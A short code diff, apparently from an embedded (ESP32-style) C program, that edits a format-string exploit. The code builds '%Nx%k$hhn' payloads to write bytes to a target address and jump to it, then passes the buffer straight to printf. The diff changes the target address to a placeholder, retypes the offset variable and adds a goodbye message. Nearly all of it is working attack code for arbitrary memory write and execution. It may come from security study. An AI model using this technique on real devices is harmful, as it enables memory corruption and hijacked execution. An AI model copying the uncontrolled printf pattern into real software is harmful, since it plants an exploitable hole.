@@ -12,7 +12,7 @@
 
 // For R/W, this is the address we read or write
 // For X, this is the address we jump to and (try to) execute
-#define TARGET_ADDRESS 0x3ffb4510
+#define TARGET_ADDRESS 0x12345678
 
 void prependAddr(char* input, int target_address)
 {
@@ -57,18 +57,19 @@ void exec_address()
 	};
 
 	int stacksize = 16;
-	int ptr = offsets[0] - stacksize;
+	short ptr;
 	char buf[15];
 
 	for(int i = 0; i < 4; i++)
 	{
-		if (i > 0) ptr = 256 - stacksize + offsets[i];
+		ptr = 256 - stacksize + offsets[i];
 		sprintf(buf, "%%%dx%%%x$hhn", ptr, i + 6);
 		strcat(input, buf);
 		stacksize = (stacksize + ptr) % 256;
 	}
 
 	printf(input);
+	printf("Goodbye\n");
 }
 
 void app_main()
